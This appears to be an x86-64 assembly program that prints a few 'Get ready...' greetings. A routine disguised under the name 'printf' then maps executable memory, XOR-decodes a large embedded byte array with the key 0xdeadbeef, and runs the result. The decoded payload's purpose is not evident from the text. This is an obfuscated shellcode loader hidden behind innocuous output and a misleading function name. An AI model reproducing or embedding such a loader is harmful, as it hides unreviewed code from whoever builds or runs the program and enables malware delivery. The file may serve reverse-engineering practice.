BITS 64

extern puts, exit, memcpy, mmap, sleep

section .data
    sHello db "Get ready...", 0
    sSuddenly db "OH MY GOOOO000000D!", 0
    mgc db 167, 51, 144, 168, 235, 190, 173, 102, 255, 174, 237, 222, 16, 110, 229, 97, 241, 83, 124, 192, 226, 190, 173, 222, 87, 130, 173, 222, 239, 177, 168, 19, 241, 246, 156, 51, 167, 143, 73, 239, 47, 246, 38, 222, 87, 191, 173, 222, 239, 65, 77, 139, 167, 55, 72, 150, 108, 82, 165, 239, 16, 0, 13, 209, 239, 190, 23, 217, 239, 190, 173, 103, 205, 190, 173, 222, 174, 6, 82, 33, 16, 65, 232, 239, 38, 6, 164, 222, 239, 190, 21, 254, 255, 254, 173, 33, 63, 246, 36, 155, 23, 246, 38, 163, 23, 246, 32, 235, 200, 190, 173, 222, 85, 123, 174, 222, 239, 6, 157, 206, 175, 190, 82, 14, 167, 51, 144, 7, 236, 190, 173, 96, 206, 190, 173, 222, 167, 53, 232, 38, 16, 110, 21, 206, 255, 254, 173, 33, 63, 119, 110, 139, 167, 55, 72, 150, 102, 195, 69, 150, 102, 203, 77, 25, 170, 66, 173, 222, 239, 190, 68, 71, 236, 190, 173, 85, 186, 66, 229, 85, 170, 86, 229, 223, 63, 177, 27, 222, 103, 251, 86, 94, 154, 69, 174, 94, 130, 69, 150, 209, 89, 251, 86, 30, 7, 185, 36, 28, 224, 8, 232, 37, 238, 126, 164, 14, 103, 251, 86, 94, 130, 69, 150, 94, 154, 69, 134, 209, 89, 251, 86, 30, 7, 187, 36, 28, 224, 8, 232, 37, 46, 94, 174, 215, 63, 54, 232, 37, 111, 251, 86, 186, 224, 8, 232, 37, 47, 86, 168, 87, 45, 177, 27, 155, 20, 127, 77, 221, 230, 110, 37, 155, 20, 62, 232, 37, 161, 62, 216, 37, 118, 62, 192, 37, 203, 177, 27, 155, 20, 126, 69, 216, 102, 124, 162, 104, 170, 69, 108, 62, 237, 183, 125, 86, 170, 69, 45, 171, 20, 234, 45, 155, 20, 146, 45, 171, 20, 219, 45, 155, 20, 179, 162, 104, 170, 69, 109, 54, 234, 55, 111, 209, 89, 251, 86, 31, 15, 189, 164, 14, 103, 251, 86, 94, 170, 69, 186, 209, 89, 251, 86, 30, 7, 189, 36, 28, 224, 8, 232, 37, 46, 94, 168, 215, 63, 54, 232, 37, 111, 203, 86, 51, 111, 251, 86, 246, 111, 203, 86, 157, 111, 251, 86, 216, 111, 203, 86, 108, 111, 251, 86, 215, 224, 8, 232, 37, 47, 86, 174, 87, 45, 177, 27, 155, 20, 127, 77, 219, 230, 110, 37, 155, 20, 62, 192, 37, 190, 62, 216, 37, 149, 62, 192, 37, 245, 177, 27, 155, 20, 126, 69, 219, 102, 124, 162, 104, 170, 69, 108, 62, 236, 183, 125, 86, 170, 69, 45, 171, 20, 173, 45, 179, 20, 222, 162, 104, 170, 69, 109, 54, 236, 55, 111, 209, 89, 251, 86, 31, 15, 187, 164, 14, 103, 251, 86, 94, 170, 69, 148, 94, 154, 69, 74, 94, 130, 69, 187, 209, 89, 251, 86, 30, 7, 185, 36, 28, 224, 8, 232, 37, 238, 126, 164, 14, 103, 251, 86, 94, 130, 69, 178, 209, 89, 251, 86, 30, 7, 188, 36, 28, 224, 8, 232, 37, 46, 94, 171, 215, 63, 54, 232, 37, 111, 211, 86, 206, 224, 8, 232, 37, 47, 86, 170, 87, 45, 177, 27, 155, 20, 191, 109, 215, 63, 54, 232, 37, 111, 211, 86, 152, 224, 8, 232, 37, 63, 86, 36, 28, 224, 8, 232, 37, 46, 94, 170, 215, 63, 54, 232, 37, 111, 203, 86, 114, 111, 251, 86, 202, 111, 203, 86, 11, 224, 8, 232, 37, 47, 86, 170, 87, 45, 177, 27, 155, 20, 191, 109, 215, 63, 54, 232, 37, 111, 211, 86, 184, 224, 8, 232, 37, 47, 86, 171, 87, 45, 177, 27, 155, 20, 127, 77, 220, 230, 110, 37, 155, 20, 62, 232, 37, 210, 177, 27, 155, 20, 126, 69, 216, 102, 124, 162, 104, 170, 69, 108, 62, 237, 183, 125, 86, 170, 69, 45, 179, 20, 215, 162, 104, 170, 69, 109, 54, 232, 55, 111, 209, 89, 251, 86, 223, 47, 183, 125, 86, 170, 69, 45, 171, 20, 77, 45, 155, 20, 187, 162, 104, 170, 69, 109, 54, 233, 55, 111, 209, 89, 251, 86, 31, 15, 188, 164, 14, 103, 251, 86, 94, 154, 69, 219, 94, 170, 69, 158, 94, 154, 69, 243, 94, 130, 69, 234, 94, 154, 69, 122, 94, 130, 69, 225, 94, 154, 69, 94, 94, 130, 69, 177, 209, 89, 251, 86, 14, 7, 55, 111, 209, 89, 251, 86, 31, 15, 185, 164, 14, 103, 251, 86, 94, 170, 69, 229, 209, 89, 251, 86, 30, 7, 184, 36, 28, 224, 8, 232, 37, 46, 94, 175, 215, 63, 54, 232, 37, 111, 211, 86, 167, 224, 8, 232, 37, 47, 86, 174, 87, 45, 177, 27, 155, 20, 127, 77, 219, 230, 110, 37, 155, 20, 62, 232, 37, 225, 62, 216, 37, 31, 62, 232, 37, 188, 62, 216, 37, 138, 62, 232, 37, 141, 62, 216, 37, 210, 177, 27, 155, 20, 126, 69, 217, 102, 124, 162, 104, 170, 69, 172, 30, 230, 110, 37, 155, 20, 62, 216, 37, 32, 62, 192, 37, 165, 62, 216, 37, 111, 62, 192, 37, 135, 62, 216, 37, 191, 62, 192, 37, 210, 177, 27, 155, 20, 126, 69, 220, 102, 124, 162, 104, 170, 69, 108, 62, 233, 183, 125, 86, 170, 69, 45, 155, 20, 250, 162, 104, 170, 69, 109, 54, 233, 55, 111, 209, 89, 251, 86, 31, 15, 188, 164, 14, 103, 251, 86, 94, 130, 69, 232, 209, 89, 251, 86, 30, 7, 189, 36, 28, 224, 8, 232, 37, 46, 94, 168, 215, 63, 54, 232, 37, 111, 251, 86, 136, 224, 8, 232, 37, 47, 86, 175, 87, 45, 177, 27, 155, 20, 127, 77, 216, 230, 110, 37, 155, 20, 62, 216, 37, 237, 177, 27, 155, 20, 126, 69, 221, 102, 124, 162, 104, 170, 69, 108, 62, 234, 183, 125, 86, 170, 69, 45, 171, 20, 100, 45, 155, 20, 232, 45, 171, 20, 211, 45, 179, 20, 152, 45, 171, 20, 2, 162, 104, 170, 69, 109, 54, 233, 55, 111, 209, 89, 251, 86, 31, 15, 188, 164, 14, 103, 251, 86, 94, 154, 69, 194, 94, 170, 69, 222, 209, 89, 251, 86, 30, 7, 189, 36, 28, 224, 8, 232, 37, 46, 94, 168, 215, 63, 54, 232, 37, 100, 235, 81, 150, 100, 251, 69, 150, 238, 124, 162, 104, 170, 69, 37, 220, 108, 251, 81, 223, 100, 251, 81, 150, 214, 251, 77, 209, 104, 228, 81, 33, 16, 6, 173, 222, 239, 190, 240, 29, 109, 236, 125, 101, 59, 145, 55, 85, 190, 124, 88, 143, 218, 52, 111, 28, 224, 52, 89, 60, 203, 124, 252, 37, 45, 52, 89, 235, 203, 167, 146, 107, 243, 137, 229, 237, 207, 225, 242, 188, 220, 138, 152, 233, 207, 143, 152, 254, 219, 233, 153, 149, 220, 240, 140, 254, 164, 247, 225, 146, 207, 247, 249, 255, 239, 228, 247, 132
    mgcL equ $-mgc
    dot db "."

section .text
    global _start
_start:
    call main
    call printf
    xor eax, eax
    xor edi, edi
    call exit
main:
    lea rdi, [rel+sHello]
    call puts
    mov rdi, 1
    call sleep
    lea rdi, [rel+sHello]
    call puts
    mov rdi, 1
    call sleep
    lea rdi, [rel+sHello]
    call puts
    mov rdi, 1
    call sleep
    lea rdi, [rel+sSuddenly]
    call puts
    mov rdi, 1
    call sleep
    ret
printf:
    ; rbp-x:
    ; x=8: mmapped area ptr
    push rbp
    mov rbp, rsp
    sub rsp, 8
    ; mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL)
    xor edi, edi
    mov esi, 8000
    mov edx, 7
    mov ecx, 34
    mov r8d, -1
    xor r9d, r9d
    mov rax, 9
    call mmap
    mov [rbp-8], rax

    ; memcpy(mmapedArea, mgc, mgcL)
    mov rdi, [rbp-8]
    lea rsi, [mgc]
    mov rdx, mgcL
    call memcpy

    ; xors mmapedArea to decode it. Payload should be % 4 == 0
    xor rcx, rcx
    mov rdi, mgcL
xorLoop:
    mov rax, [rbp-8]
    add rax, rcx
    xor DWORD [rax], 0xdeadbeef
    add rcx, 4
    cmp rdi, rcx
    jg xorLoop

    mov rax, [rbp-8]
    call rax

    leave
    ret
